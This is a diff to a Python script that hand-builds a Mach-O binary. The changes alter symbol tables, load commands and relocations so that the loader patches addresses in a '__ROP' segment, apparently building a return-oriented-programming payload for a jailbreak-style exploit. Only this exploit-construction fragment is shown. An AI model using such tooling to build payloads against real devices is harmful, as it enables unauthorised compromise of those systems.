@@ -59,7 +59,13 @@ def command(cmd, stuff):
     commands.append(I(cmd, len(stuff) + 8))
     commands.append(stuff)
 
+reloc_base = None
+
 def segment(segname, vmaddr, vmsize, data, maxprot, initprot, sects=[]):
+    global reloc_base
+    # dumb, but that's the spec!
+    if reloc_base is None: reloc_base = vmaddr
+
     length = len(data)
     if vmsize is None: vmsize = (length + 0xfff) & ~0xfff
     offset = len(segments)
@@ -112,7 +118,7 @@ def import_sym(ordinal, name, subtract=0):
         strx,
         0, # n_type = N_UNDF
         0, # n_sect is ignored?
-        ordinal << 8, # n_desc
+        (ordinal + 1) << 8, # n_desc
         subtract, # n_value (with prebound set, this is subtracted)
     )
     return len(symtab) / 12 - 1
@@ -125,47 +131,12 @@ def reloc(sym, address):
     r_type = 0
 
     relocs += I(
-        address,
+        (address - reloc_base) & 0xffffffff,
         (r_type << 28) |
         (r_extern << 27) |
-        (r_length << 26) |
+        (r_length << 25) |
         (r_pcrel << 24) |
         sym)
-
-libs = {}
-for path in data['libs']:
-    libs[path] = load_dylib(path, 0, 0, 0x010000)
-sym = import_sym(libs['/usr/lib/libSystem.B.dylib'], '_getpid', subtract=dmini.cur.sym('_getpid'))
-for addr in rop_relocs:
-    reloc(sym, addr)
-
-symtab = pointed(symtab)
-relocs = pointed(relocs)
-strtab = pointed(strtab)
-
-command(0xb, I( # LC_DYSYMTAB
-    0, 0, # localsym
-    0, 0, # extdefsym
-    0, len(symtab) / 12, # undefsym
-    0, 0, # toc
-    0, 0, # modtab
-    0, 0, # extrefsym
-    0, 0, # indirectsym
-    pointer(relocs), len(relocs) / 8, # extrel
-    0, 0, # locrel
-))
-
-command(2, I( # LC_SYMTAB
-    pointer(symtab), # symoff
-    len(symtab) / 12, # nsyms
-    pointer(strtab), # stroff
-    len(strtab), # strsize
-))
-
-linkedit_rest.append(initializer)
-linkedit_rest.append(symtab)
-linkedit_rest.append(relocs)
-linkedit_rest.append(strtab)
 
 segment('__LINKEDIT', 
     linkedit_address,
@@ -179,6 +150,42 @@ segment('__LINKEDIT',
       'flags': 0x9, # S_MOD_INIT_FUNC_POINTERS
       }]
 )
+
+libs = {}
+for path in data['libs']:
+    libs[path] = load_dylib(path, 0, 0, 0x010000)
+sym = import_sym(libs['/usr/lib/libSystem.B.dylib'], '_getpid', subtract=dmini.cur.sym('_getpid')&~1)
+for addr in rop_relocs:
+    reloc(sym, addr)
+
+symtab = pointed(symtab)
+relocs = pointed(relocs)
+strtab = pointed(strtab)
+
+command(2, I( # LC_SYMTAB
+    pointer(symtab), # symoff
+    len(symtab) / 12, # nsyms
+    pointer(strtab), # stroff
+    len(strtab), # strsize
+))
+
+linkedit_rest.append(initializer)
+linkedit_rest.append(symtab)
+linkedit_rest.append(relocs)
+linkedit_rest.append(strtab)
+
+command(0xb, I( # LC_DYSYMTAB
+    0, 0, # localsym
+    0, 0, # extdefsym
+    0, len(symtab) / 12, # undefsym
+    0, 0, # toc
+    0, 0, # modtab
+    0, 0, # extrefsym
+    0, 0, # indirectsym
+    pointer(relocs), len(relocs) / 8, # extrel
+    0, 0, # locrel
+))
+
 
 segment('__ROP',
     rop_address,
